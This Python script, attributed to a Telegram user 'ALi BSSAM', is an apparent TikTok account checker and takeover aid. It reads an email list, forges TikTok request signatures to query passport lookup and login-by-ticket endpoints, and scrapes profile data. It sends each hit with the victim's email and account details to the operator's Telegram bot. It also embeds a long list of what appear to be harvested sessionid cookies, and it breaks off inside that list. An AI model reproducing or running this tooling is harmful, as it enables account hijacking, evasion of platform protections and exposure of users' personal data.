import time
import random
from colorama import Fore, Style, init
from pyfiglet import Figlet

# تهيئة Colorama لتوافقية أفضل مع أنظمة التشغيل المختلفة
init(autoreset=True)

def neon_logo_pulsating(text, duration=5, font='standard'):
    """
    يعرض نصًا كشعار نيون كبير مع تأثير ألوان متذبذبة.
    """
    f = Figlet(font=font)
    ascii_text = f.renderText(text)

    start_time = time.time()
    # ألوان نيون ساطعة
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]

    # الحصول على عدد أسطر النص ASCII لمسح الشاشة بشكل صحيح
    num_lines = ascii_text.count('\n') + 1

    while time.time() - start_time < duration:
        chosen_color = random.choice(colors)
        
        # مسح الأسطر السابقة قبل الطباعة لإنشاء تأثير التذبذب
        # هذا يعمل بشكل أفضل في معظم المحطات الطرفية
        for _ in range(num_lines):
            print("\033[F\033[K", end="")

        print(f"{chosen_color}{Style.BRIGHT}{ascii_text}{Style.RESET_ALL}", end="", flush=True)
        time.sleep(0.15) # ضبط هذه القيمة لسرعة التذبذب (قيمة أقل = أسرع)

# استدعاء الدالة مع اسمك
# يمكنك تجربة خطوط مختلفة مثل 'big', 'slant', 'banner', 'block'
neon_logo_pulsating("ali bssam", duration=5, font='banner')


import requests
import threading
import random
import datetime
from user_agent import generate_user_agent as x
from SignerPy import sign, get
import os
import sys
import ST4,secrets
import time
import uuid
from urllib.parse import urlencode
from os import urandom
import binascii
from os import system 
import hsopyt 
import string
import time,hashlib
import string,secrets
from urllib.parse import urlencode
import random,uuid
import json
import binascii
import os
from SignerPy import sign, get
from random import choice,randrange,randint
from os import urandom
from threading import Thread as F400
from concurrent.futures import ThreadPoolExecutor as F300
import datetime
import sys
import re

from ST4 import HOTMAIL as nothing
P='\x1b[38;5;231m'
J='\x1b[38;5;208m'
J1='\x1b[38;5;202m'
J2='\x1b[38;5;203m'
J21='\x1b[38;5;204m'
J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'
C1='\x1b[38;5;120m'
P1='\x1b[38;5;150m'
P2='\x1b[38;5;190m'
BR = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m' 
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
MJ4 = '\x1b[38;5;106m'
ma = '\x1b[38;5;26m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
G = '\033[1;34m' #ازرق فاتح
HH='\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
Y="\033[1;33m" # Yellow
class HSO:
    def __init__(self):
        self.logo = '''

╭─────────────★─────────────╮
│        │
│  Telegram : @ALi BSSAM       
│ 
╰─────────────★─────────────╯
'''
        self.id=input(f"{G}[ + ] id : {M} ")
        self.token=input(f"{G}[ + ] Token  : {M} ")
        os.system("cls" if os.name == "nt" else "clear")
        self.hit=0
        self.gt=0
        self.bt=0
        self.ge=0
        self.be=0
        self.secret=secrets.token_hex(16)
        self.ses=requests.Session()
        self.colors = [BR, AH2, AS2, MJ, MJ2, MJ3, MJ4, ma]
        self.random_color = random.choice(self.colors)
        self.q=(self.random_color+self.logo)
        for i in self.q.splitlines():
            print(i)
            time.sleep(0.05)
        self.name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(random.randrange(5,10)))
        self.keyword= random.choice(
    [
    'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',  
    '1234567890azertyuiopmlkjhgfdsqwxcvbn',  
    'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
    'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
    'ABCÇDEFGĞHIİJKLMNOÖPRSŞTÜVYZ',  
    'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ',  
    'अआइईउऊऋएऐओऔकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',  
    'ابپتثجچحخدذرزژسشصضطظعغفقکگلمنوهی'
    ]
    )
        self.birthday = random.randrange(1980,2010),random.randrange(1,12),random.randrange(1,28)
        #print(self.API_CH('chuechue201220@gmail.com'))
        self.dev="@FFNZZ"
        self.select()
    def select(self):
        try:
            self.sec = 3
        except Exception as e:
            print(e)
            exit("Error Input ")
        if self.sec ==3:
            self.file = input("File Name > ")
            try:
                self.max = int(input("input Numper For Threading 1-50 : "))
            except:
                exit("error Number  ")
            os.system("cls"if os.name=="nt"else"clear")
            for i in self.q.splitlines():
                print(i)
                time.sleep(0.05)
            self.admin_gmail()


    
    def signn(self, params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):
             x_ss_stub = hashlib.md5(payload.encode('utf-8')).hexdigest() if payload != None else None
             data=payload
             if not unix: unix = int(time.time())
             return hsopyt.Gorgon(params, unix, payload, cookie).get_value() | { "x-ladon"   : hsopyt.Ladon.encrypt(unix, license_id, aid),"x-argus"   : hsopyt.Argus.get_sign(params, x_ss_stub, unix,platform        = platform,aid             = aid,license_id      = license_id,sec_device_id   = sec_device_id,sdk_version     = sdk_version_str, sdk_version_int = sdk_version)}
    
    def sign2(self, params: str, payload: str or None = None, sec_device_id: str = '', cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = 'v05.00.06-ov-android', sdk_version: int = 167775296, platform: int = 0, unix: float = None):
        x_ss_stub = hashlib.md5(payload.encode('utf-8')).hexdigest() if payload != None else None
        if not unix: unix = time.time()
        return hsopyt.Gorgon(params, unix, payload, cookie).get_value() | {
            'content-length' : str(len(payload)),
            'x-ss-stub'      : x_ss_stub.upper(),
            'x-ladon'        : hsopyt.Ladon.encrypt(int(unix), license_id, aid),
            'x-argus'        : hsopyt.Argus.get_sign(params, x_ss_stub, int(unix),
                platform        = platform,
                aid             = aid,
                license_id      = license_id,
                sec_device_id   = sec_device_id,
                sdk_version     = sdk_version_str, 
                sdk_version_int = sdk_version
            )}
            
    def rest(self, username):
        params = {'_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",    'cdid': str(uuid.uuid4()),'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),    'iid': str(random.randint(1, 10**19)),    'device_id': str(random.randint(1, 10**19)),    'openudid': str(binascii.hexlify(os.urandom(8)).decode())}
        device_id = params["device_id"]
        iid = params["iid"]
        cdid = params["cdid"]
        openudid = params["openudid"]
        _rticket = params["_rticket"]
        ts = params["ts"]
        params={'_rticket':_rticket,'ab_version':'37.8.5','ac':'WIFI','ac2':'wifi','account_param':username,'aid':'1233','app_language':'ar','app_name':'musical_ly','app_type':'normal','build_number':'37.8.5','carrier_region':'US','carrier_region_v2':'460','cdid':cdid,'channel':'googleplay','cronet_version':'75b93580_2024-11-28','device_brand':'rockchip','device_id':device_id,'device_platform':'android','device_type':'rk3588s_q','dpi':'320','fixed_mix_mode':'1','host_abi':'arm64-v8a','iid':iid,'is_pad':'0','language':'ar','last_install_time':'1745162892','locale':'ar','manifest_version_code':'2023708050','mix_mode':'1','op_region':'US','openudid':openudid,'os':'android','os_api':'29','os_version':'10','region':'IQ','request_tag_from':'h5','resolution':'720%2A1280','rrb':'%7B%7D','scene':'4','ssmix':'a','support_webview':'1','sys_region':'IQ','timezone_name':'Europe%2FAmsterdam','timezone_offset':'3600','ts':'1745163105','ttnet_version':'4.2.210.6-tiktok','uoo':'0','update_version_code':'2023708050','use_store_region_cookie':'1','version_code':'370805','version_name':'37.8.5','app_version':'32.9.5'}
        m=self.sign2(urlencode(params), '', "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None, 1233)
        response = requests.post("https://api16-normal-c-alisg.tiktokv.com/passport/account_lookup/username/", params=params,headers={'User-Agent':'com.zhiliaoapp.musically/2023708050 (Linux; U; Android 10; ar_IQ; rk3588s_q; Build/QD4A.200805.003; Cronet/TTNetVersion:75b93580 2024-11-28 QuicVersion:ef6c341e 2024-11-14)','Accept': "application/json, text/plain, */*",'x-argus':m["x-argus"],'x-gorgon':m["x-gorgon"],'x-khronos':m["x-khronos"],'x-ladon':m["x-ladon"]})        
        # print(response.text) # Keep this for debugging if needed, but it can be noisy
        result = {"status": "Not Found"}
        
        if 'passport_ticket' in response.text:
            ticket = (response.json()['data']['accounts'][0]['passport_ticket'])
            params={'_rticket':_rticket,'ab_version':'37.8.5','ac':'WIFI','ac2':'wifi','aid':'1233','app_language':'ar','app_name':'musical_ly','app_type':'normal','build_number':'37.8.5','carrier_region':'US','carrier_region_v2':'460','cdid':cdid,'channel':'googleplay','cronet_version':'75b93580_2024-11-28','device_brand':'rockchip','device_id':device_id,'device_platform':'android','device_type':'rk3588s_q','dpi':'320','host_abi':'arm64-v8a','iid':iid,'is_pad':'0','language':'ar','last_install_time':'1745162892','locale':'ar','manifest_version_code':'2023708050','op_region':'US','openudid':openudid,'os':'android','os_api':'29','os_version':'10','passport_ticket':ticket,'region':'IQ','request_tag_from':'h5','ssmix':'a','support_webview':'1','sys_region':'IQ','timezone_name':'Europe%2FAmsterdam','timezone_offset':'3600','ts':'1745163107','ttnet_version':'4.2.210.6-tiktok','uoo':'0','update_version_code':'2023708050','use_store_region_cookie':'1','version_code':'370805','version_name':'37.8.5','app_version':'32.9.5'}
            m=self.sign2(urlencode(params), '', "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None)
            response = requests.post("https://api16-normal-c-alisg.tiktokv.com/passport/user/login_by_passport_ticket/",params=params, headers={'User-Agent': "com.zhiliaoapp.musically/2023708050 (Linux; U; Android 10; ar_IQ; rk3588s_q; Build/QD4A.200805.003; Cronet/TTNetVersion:75b93580 2024-11-28 QuicVersion:ef6c341e 2024-11-14)",'Accept': "application/json, text/plain, */*",'x-argus':m["x-argus"],'x-gorgon':m["x-gorgon"],'x-khronos':m["x-khronos"],'x-ladon':m["x-ladon"]})
            # print(response.text) # Keep this for debugging if needed
            try:
                kl = json.loads(response.headers.get('X-Tt-Verify-Idv-Decision-Conf'))['extra'][0]['info']
                result = {"status": kl}
            except Exception as e:                        
                result = {"status": "Try Again"}
        
        return result
    
    def info(self,email):
            self.hit+=1

            user = email.split("@")[0]
            patre = {
    "Host": "www.tiktok.com",
            "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"99\", \"Google Chrome\";v\u003d\"99\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
            "sec-fetch-site": "none",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "accept-language": "en-US,en;q\u003d0.9,ar-DZ;q\u003d0.8,ar;q\u003d0.7,fr;q\u003d0.6,hu;q\u003d0.5,zh-CN;q\u003d0.4,zh;q\u003d0.3"
        }
            tikinfo = requests.get(f'https://www.tiktok.com/@{user}', headers=patre).text
            try:
                getting = str(tikinfo.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
                id = str(getting.split('id":"')[1]).split('",')[0]
                name = str(getting.split('nickname":"')[1]).split('",')[0]
                bio = str(getting.split('signature":"')[1]).split('",')[0]
                country = str(getting.split('region":"')[1]).split('",')[0]
                private = str(getting.split('privateAccount":')[1]).split(',"')[0]
                followers = str(getting.split('followerCount":')[1]).split(',"')[0]
                following = str(getting.split('followingCount":')[1]).split(',"')[0]
                like = str(getting.split('heart":')[1]).split(',"')[0]
                video = str(getting.split('videoCount":')[1]).split(',"')[0]
                B = bin(int(id))[2:]
                L, BS = 0, ""
                while L < 31:
                    BS += B[L]
                    L += 1
                Date = datetime.datetime.fromtimestamp(int(BS, 2)).strftime('%Y')
                
                vipQvip = self.rest(user)
                
                ff = f"""
╔═══════☆ جبتلك حساب  ☆═══════╗
┃                         : {self.hit}
┃ 👤 Name       : {name}
┃ 🔰 Username   : {user}
┃ 📧 Email      : {email}
┃ 🆔 ID         : {id}
┃ ➕ Following  : {following}
┃ 👥 Followers  : {followers}
┃ ❤️ Likes      : {like}
┃ 🎬 Videos     : {video}
┃ 📅 Date       : {Date}
┃ 🔒 Private    : {private}
┃ 🏳️‍ Flag      : {self.country_code_to_flag(country)}
┃ 🌍 Country    : {country}
┃ 🔄 Rest Status: {vipQvip['status']}
┃
╚═══════☆ 𝗧𝗶𝗸𝗧𝗼𝗸 ☆═══════╝
"""
                with open("حسابات تيك توك.txt",'a',encoding="utf-8")as h:
                    h.write(ff+"\n")
                requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.id}&text=" + str(ff))
                print(f"{F}[HIT] {email} - Rest Status: {vipQvip['status']}") # Added print for hit
            except Exception as e:
                print(f"{E}[ERROR] {email} - Could not get TikTok info: {e}") # Added error print
                vipQvip = self.rest(user)
                
                ff = f'''
╭───────⌯ 𝗧𝗶𝗸𝗧𝗼𝗸 ⌯───────╮
│ 🎯 Hit       : {self.hit}
│ 🆔 Username  : {user}
│ 📧 Email     : {email}
│ 🔄 Rest Status: {vipQvip['status']}
│
╰───────⌯ 𝗧𝗶𝗸𝗧𝗼𝗸 ⌯───────╯
          
'''
                with open("TIKTOK - BROKIN.txt",'a',encoding="utf-8")as h:
                    h.write(ff+"\n")
                requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.id}&text=" + str(ff))
    def API_CH(self , email ):
        cookies ={
            "passport_csrf_token": self.secret,
            "passport_csrf_token_default": self.secret,
            "sessionid":random.choice([
                'f8327fd411de8d6be001d5afb4339c54',
    '81ce8ac996892c2e806ae60a6d9723ee',
    '92e523982bbb3b2b85cd92bf3c04311b',
    '226928d4b716260e71f81c010e426134',
    'ff59fc7171841da0b7cd60137b148410',
    'c612842dccf747c48fb2514d954fe192',
    '3caa06e12edc56eb77f081bfe5426763',
    'ea59a97a0102375170a20bcacc8edb4c',
    '06051e2753a54b6f0afae74fe2d0b7ad',
    '3444e9b4b06bba9f78570091586f20d6',
    'ffa303901aed13a9c1fa851fbe81741d',
    'c496079448e266735cc4c78269b2a983',
    'b6acb99c05b13b9ff866c26ee64a8fa8',
    '4f761f08a724692c9ecb5e7fc54cbea3',
    '2747f4c3d1f3b922f7b86dcd546af8d7',
    'cd4489ef3fe23ddc68ad4454c9cabc41',
    '5a0d6b2ca82d8824852148c22e146910',
    '2ad32b398e15e80e443f922ab4928447',
    '5a4a4c8c746d55a3cae7f32a127513aa',
    'f4ea0fc94454b6a47fafb09a00aeb0e8',
    '6bf28abdc354288b73bf99008f6a361f',
    'df7246019b382003c7d438e2eec3f812',
    'f4fd0301c875e5a5da06c14fd136934c',
    '20f03a3785cbab1d1f242c50a8b2ef21',
    '93bf67de66b6ddff3a75c3aec78e7276',
    '0428ad14102a079e02df973ef9c3ca34',
    'a7a6042fd8bb7aa59496346d9646e46f',
    '525d663adcec79b1601cdfa2125627dc',
    '8100a904b508f86fa19c3b3a2146a979',
    'd972be2b916d7cb7a3e2c534dac73439',
    '30c2b94bf3ddd98952a6f28137250375',
    'fd4cd15633d1ebceccc492d509a9522b',
    '648c1df7cef3ed3bd814c932939ce846',
    '0f2d6256d2252a5cecd575b76009e8c2',
    'bb4cef9ef619cb46f0a45c308c0d1e25',
    '278b94bbb57a92ff23d92c5c52e1d57e',
    '59317ae149b292fa766df9b805d4012e',
    '40035d852d85c40b180d5154dce74e32',
    '572670e81c97c6b16e081ee0243883b5',
    '8a53b9f0b2ad46141f3ef206170ea95f',
    'e54ae478d3928c1980661d3dcc81127e',
    'cec657d01305d24d62ead1ebca1ea0de',
    '1aa7da779bfb34e9adcda9d330242347',
    '0727771a119768c35ddad138ae669ccb',
    'b394eaa0f2376832f1e65701406872b4',
    '1fc1c3d992d806afbb88fb05b3f8b51b',
    '56e02966f4761a361a575db0a32ba2f7',
    '978573dbd8fb062130305da932016754',
    '466efa18c526a080549b97f03305a3a9',
    '1f7b16535d0c8f91d1b0f0d4291726c7',
    'c5a5d59db6c74831c598bbacee8ad25a',
    '2b052a3a01222be0da70fd2849f6f849',
    '18c9b9a235c938b34c1f8c5af3c65eb3',
    '847ce0bac8342d7e63798419c0958268',
    '08d0463c3ea0a3c7ef8f6a8e2e341528',
    '138b138be22630bb46a0dd4d747dc037',
    '6f8fd20e4cfb6af8d68e38284f732269',
    '266d4adf7a9741e20386d77215fe1e1c',
    'f76100b0c36e12ceec7dfedebb50f967',
    'df8419589aec20f583de70c2302a87c5',
    '987b534331cb8fe0426158e4f8f39124',
    '1b1d59bf2bbe2458f5b9287c3b41af22',
    'a7739802b84434c4175225a907bc4df7',
    'aafb7b56836cffdb34d99407f2732e6d',
    '48399b568941080f90b6da6cc0f40b63',
    '9689fb7803f6b4b105e01eda4ab43667',
    '536ae2abec9ed18942939af83296b8ef',
    '40210b4815aa47f3d2cfeb45cf713bea',
    '2aa562d2463d90d723fac8d46b58246c',
    'a2e045e87922de8c8c5339b04cc23adb',
    'ac0e0ddf12a03efdee2da1965064e655',
    '07535b9405b8573072acc54136195a26',
    '61705fae4cd68501d35123df3948656d',
    'e30441f84bebed5ab7fe0c81345b40cc',
    'e9191cf652801115dfd7cc9ce0754492',
    '508ac0dd034d89232616a44f62077380',
    '37d64a41ccfc523b86ba4c6333d2aed7',
    '8d66c48de36a4d3947a452273d3cb677',
    'e29d771a2cf7e0185e47a234d57c1808',
    'e642398744544cd043b0ed8e545303f7',
    'a2d2200d243e5d9eb2309b0a59b9583a',
    'f0aa37632755d7e04da7a77f54ea1519',
    'c517f560947625ed86f27435282dd234',
    'e365a3aa9f85099e53c0ea46f946a567',
    '6324058bdfe884515217ff4acb90073d',
    'ea0d61a88aa3cceb24480d86b9971e2e',
    '7070e4defde4cc89c964dc3526c49dec',
    '65250bcba1797629587c18ce4240a853',
    'bcd76f78aacd79f0e04453901b7b8c65',
    '14f1735a3ac77dc63e18a59bda77edee',
    '220a3c08704e2d0a46c9d9b43854e682',
    '9f0c1ac60c09af5a942bd5df9ae05cdf',
    '90ba1ff26cf1fbca017d44a8be05f41d',
    'fcadc9245d341fc099ba5924100019ed',
    'b6d6d6c88a2405fd025cf56ff7124473',
    '971d7038eb4ee04c7e52209ef7ee5755',
    '98106f1cebb49c19e8e0fa465ea2e979',
    '70b4866e3573692bdda7679e8e5d3939',
    '1c21012aa111369c85ff963c4bc30e29',
    'ff3c13526e2a360a1fefaca8c41e9ce3',
    '8b083ff40730e0cd42eb639598906af5',
    '08af99cac4c0a488bf5500351ad31a50',
    '3384108b77d946ccd84b8c50c0576c56',
    '129eef9249b541845eba16fc14781582',
    '6ac7cb6a6cd03bf5e8e9c5dbe2fa7b71',
    '066a9c1d63023e9697101b18dff58cc5',
         "1232e3b522985d084e6dc5f09927250b",
            "6543899cce4328907dba50c5b9aa63c5",
               
           "e30781fff036cc5eb205e7c58dfbb7bd",

"2593796f7e6b8b336682c32360475555",

"d0d806d6108275dfa1152a6e7879979c",

"a10c0adde90da8a842901d661a8d658d",   
    "3b430002ae1d099bfc055494acea77ac",

    "7f108a47a8c39f143787a8fe6593d349",


'c4fa59b59ece70395023afe78baa5d8a', 
'36144c9f68b6eb8aefb501a6a31e8118', 
'ccbe4b0c894f0d4c1e5c679f07287b3b', 
'cb74967182ec687b9fc0435bc4fcae89', 
'21953b31d25e7b508e8c64c24f48a108', 
'1b3360c5cec4c44457b8813cb9536e45', 
'3df46a118be3401707d30327a8858d74', 
'900b6e7958a805f3113f317b938c1ebb', 
'a147960a734ce913251d91e75bd41de2', 
'263610f531b715adfb34d26567e9b6f3', 
'b6fde9cea09ad4be89b9121b7f1a7a04', 
'9edada27bfcec7e8a1ff649beea19c76', 
'1926dd91277c79633c4cde74ecf5182e', 
'd64af91724d38f7bc73b3fef0fca8db9', 
'20b2f37bbcf5595b9d3a513df868f10a', 
'73a38762633252801cc48c7ce96b126a', 
'8ded08b5a2f7c138f82ef19bff62b014', 
'08fb9b8270b8885efcd6348821a3b595', 
'01a268b5490b71262326329776e67e42', 
'bcbe07458dd7cb6bcf41da270fc7eec8', 
'9c3901e64f0920e9f0efd8dcbb09c9af', 
'1a4bdfb7776f6734298f4c9075d2a418', 
'0138e069e8fe6c8b07e1a0db9038a332', 
'2d9940d16376dee30d53112f55a15136', 
'aafcba353ff35b0031746c72682aaca2', 
'9dea2180a9e6edf163a18f9f0420496c',  
'ab10d6d678a0d48de5bd51f16009b4d8', 
'87e11bed392b70782e58dec0370d8447', 
'1d3f912a6800fbdf69a3fc383ce5ee58', 
'93d69013bc71583716e497c7fc17ca27', 
'f250acc8b1e5d5f92ee8be3699fd6536', 
'b2aecd030b057c45366dad00cefecd7d', 
'4b4c3c47cbdd5bd38202403125091a51', 
'9e71174495cc2c9ff6674b29233305ff', 
'f9044bb2a34f86a45b45171e0a92ef6d', 
'cac437b128dbe68afbd33d0e80e56483', 
'36a704a0ee788e83c547efd31eea3846', 
'0e3dd0aca3cab9de1edd01492d849ac5', 
'632b6cab67509bbfe17c0db9e49617d8', 
'0064350770d0ccca2ab54a379b8ba9bf', 
'b25614823870dcfcba6fdef6e72af5d1', 
'29e5a771a6b47b114b75af600e290edd', 
'e410b62db135a6e953714b2405808e97', 
'fca9734feeec2910a19ef9dd57d8426a', 
'7298c225f1bb7025e2c74b3146e8e497', 
'7772b65eaf8af91e68b40b6faed360cb', 
'b51f36b2cefac35c1847bb1631113588', 
'a376eb74de92c39e43114c740490477d', 
'f466e8e3e2f43915db01ae6efbcf5e7b', 
'32ace4984ce8e910fdb958cf55f01c40', 
'5325618720103e7987ac8e1eb7777f79', 
'c563af7e7ffd63bf083e1f18d78dfb0d',  
'44f37d99726fc9895b947db8e822469f', 
'eeb95e2378303763df06c3a40a5f3a95', 
'30f8ff14e3d5c84f88a1f58d50c59105', 
'c3058b76be0aba378b47697c535eb916', 
'f8bf6728107043373708242322f1f670', 
'a601ada714efa44e70e6a3f202dd7f67', 
'681d5ccf400a4d522a05155627c37415', 
'c7bf9f67464ca6ad4d7027dbd1a39b27',  
'140f6b043b7965b4593d31bc74b720d4'
'c4fa59b59ece70395023afe78baa5d8a', '36144c9f68b6eb8aefb501a6a31e8118',
            'ccbe4b0c894f0d4c1e5c679f07287b3b', 'cb74967182ec687b9fc0435bc4fcae89',
            '21953b31d25e7b508e8c64c24f48a108', '1b3360c5cec4c44457b8813cb9536e45',
            '3df46a118be3401707d30327a8858d74', '900b6e7958a805f3113f317b938c1ebb',
            'a147960a734ce913251d91e75bd41de2', '263610f531b715adfb34d26567e9b6f3',
            'b6fde9cea09ad4be89b9121b7f1a7a04', '9edada27bfcec7e8a1ff649beea19c76',
            'd64af91724d38f7bc73b3fef0fca8db9', '20b2f37bbcf5595b9d3a513df868f10a',
            '73a38762633252801cc48c7ce96b126a', '8ded08b5a2f7c138f82ef19bff62b014',
            '08fb9b8270b8885efcd6348821a3b595', '01a268b5490b71262326329776e67e42',
            'bcbe07458dd7cb6bcf41da270fc7eec8', '9c3901e64f0920e9f0efd8dcbb09c9af',
            '1a4bdfb7776f6734298f4c9075d2a418', '0138e069e8fe6c8b07e1a0db9038a332',
            '2d9940d16376dee30d53112f55a15136', 'aafcba353ff35b0031746c72682aaca2',
            '9dea2180a9e6edf163a18f9f0420496c', 'ab10d6d678a0d48de5bd51f16009b4d8',
            '87e11bed392b70782e58dec0370d8447', '1d3f912a6800fbdf69a3fc383ce5ee58',
            '93d69013bc71583716e497c7fc17ca27', 'f250acc8b1e5d5f92ee8be3699fd6536',
            'b2aecd030b057c45366dad00cefecd7d', '4b4c3c47cbdd5bd38202403125091a51',
            '9e71174495cc2c9ff6674b29233305ff', 'f9044bb2a34f86a45b45171e0a92ef6d',
            'cac437b128dbe68afbd33d0e80e56483', '36a704a0ee788e83c547efd31eea3846',
            '0e3dd0aca3cab9de1edd01492d849ac5', '632b6cab67509bbfe17c0db9e49617d8',

'0064350770d0ccca2ab54a379b8ba9bf', 'b25614823870dcfcba6fdef6e72af5d1',
            '29e5a771a6b47b114b75af600e290edd', 'e410b62db135a6e953714b2405808e97',
            'fca9734feeec2910a19ef9dd57d8426a', '7298c225f1bb7025e2c74b3146e8e497',
            '7772b65eaf8af91e68b40b6faed360cb', 'b51f36b2cefac35c1847bb1631113588',
            'a376eb74de92c39e43114c740490477d', 'f466e8e3e2f43915db01ae6efbcf5e7b',
            '32ace4984ce8e910fdb958cf55f01c40', '5325618720103e7987ac8e1eb7777f79',
            'c563af7e7ffd63bf083e1f18d78dfb0d', '44f37d99726fc9895b947db8e822469f',
            'eeb95e2378303763df06c3a40a5f3a95', '30f8ff14e3d5c84f88a1f58d50c59105',
            'c3058b76be0aba378b47697c535eb916', 'c7bf9f67464ca6ad4d7027dbd1a39b27',
            '140f6b043b7965b4593d31bc74b720d4', '8f09f3ae2ae631cf7e633f0731dc5765',
            '689b28321819e175075a1c52a875aa10','51742b4d12eee256f2b5cef78762f7e3',
            '80f75f02c7b7ed70507b8788ee4e332b', '0ede7d94f7844b3eb2a84c2b74787a18',
            'abf81647b3cc6342e4d37bfb15071f47', '77b8a5ca219eefbc73b5ec1d37bd1878',
            '860b1c9e2e32d114150f7531a31aee12',
'60fa764bc7f52a3c302b9da366e8ddee',
'4a86af49c0d2cc7b1a0570a767a06049',
'25fc3dd233e5c69d3529c567d434aadd',
'f0311769f6ec98bd296fd20e96d7cc4a',
'e17a001f27ca66209bce3877fbf25c0f',
'db63545ec894c52649c332c9e3ba7a8f','48321d7c0d829d208e954aad4ea13bd6',
'c3c21303e924f9432cc16d090b21525b','4a47e8b2334dee56d97b718d7a9c5e25',
'a1fb2e3b964e87510369376ad841a0c4',
'86fff059edd8031249c192acd7729534',
'13e7698d1b2233dcb239511c59293fc3',
"cafe66f2ae8a76f077cbd626ea86df79", "9c5f3bd655c1073be5766126e5de6fd3",
                "53824e1723b4981d6cd70509b914098f", "1342c2d734388562d6459a5a9fe72792",
                "f1ff89b59a6ba357d77e98bdcf255cab", "7da0a62f4f89c6649b8dfa160d6cec8d",
                "dbf07d996eb8201596c24c09ae323267", "9cc709863127d0aaf365cd16de02c219",
                "55e806351ecd3cc6b61ef91aecc7e505", "697da55c5506fd52436c701c1e2b52f4",
                "bf0bb6f9349449bd775325522cceba25", "57169db67755173ad686ac0adbf61b2c",
                "414944c36526c4965203cdc5d6430586", "a2939903b2da2d314749d9eda608dee8",
                "42b2e8551486b0628ab16c7cc8e90ba1", "27005da3a7d772cb382c3eaac3c090af",
                "ab44c8c16bc5aaf4f3edef66b8915ef7", "2274f897b348647258efdb1b005216e0",
                "d8dffcf38a761c5e8a509b4aea7a4303", "6052a82299cb2b38874dee88c82a0d21",
                "93ab06dc14cef94ffacf9cad56314b65", "ff925b0293db2e1a647b4f615fd815e5",
                "329e7d2ca6364cf94db07ab521275673", "acaed5f00fb0910a53772ec701b9e850",
                "a4a9c45ce50f087e31d8dd90606565dc", "610a8a6ccf26c62d0849a292918eaafe",
                "41fe5fe6c60679e9ec18c5af7ba05c69", "c83a8c956921e7e35398c02d554112b5",
                "9c4254d518f4796d67825fcf1b35cfa8", "c544414665b9558f8157a55e65f7d44e",
                "d7ca96c365b263675a102a582972feea", "5bb1cd7de83db6f316b69e3b045701dc",
                "5845e1e5be9ef3bf73c22b6527bd0c8e", "37fb0b33c8e72da7130d41dbb466db86",
                "9cf1061a9235aad06d4dda19485a108c", "07849301f75b8ba5090258904cdb98f4",
                "8eae100188029eca8fd6002b2198de8f", "69ac0eea723bdfda1f1633171ba4e18f",
                "3599955114effa5ff50e494135012856", "a1593241c82c93e5c19fa180ef5b21a6",
                "a624d9823074741e1a91bf1cbcccfd63", "69be771087f3392967cf9dddf6c76935",
                "fb2253e2732428600ff8bfdaa1229adc", "594e8f0cd3bd7d7bed94161b9aee6b86",
                "68ca12e10055cf7f3e8200d82586d8d3", "e6e25d852227cc3006fdfef85dd38d81",
                "e160f93facb5c030a029c74beb2e234b"
    "df7a17980c069db2316fc6d8e668cacf",
    "65c6dd105c5248895834a5741498129d",
    "6c660a20292158a17086f76ea489596b",
    "57b1bb14939a7ffee8e8cf7ae1e58b64",
    "c66892b3b7062a2287f338d3c75d28b5",

"31b2653d315ad2df648c59be4dd3c97b",
    "6f3fcaabd10994c4d6f3c8987a02c11b",
    "97979e4ead059d1bf51f8048a6038a44",
    "6f3fcaabd10994c4d6f3c8987a02c11b",
    "c44bdacce13656aa68928a267a00885d",
    "69db14f49c65f829ba228fb674dc5783",
    "5121da46ebd6908c661f204eb1bdf390",
    "cd9dd1c4b4598d7a95dc4d296c055e4c",
    "a948087e8602647aa2417b71401b98c8",
    "7bc7638f77025b0c8f397913adb23944",
    "49962c217f3b05f2bc46f1ce1382b664",
    "12982ad9ea91dcf1a21027dd75eb7715",
    "733a6bc05f842ec198e5dcc00f4c8f40",
    "5afb092e4e8b8f317afd0ca790dd4b12",
    "7eab67b617139a5cd4d54acb74a981ec",
    "05946e47542c4bfb7dd1029ac9d02d9f",
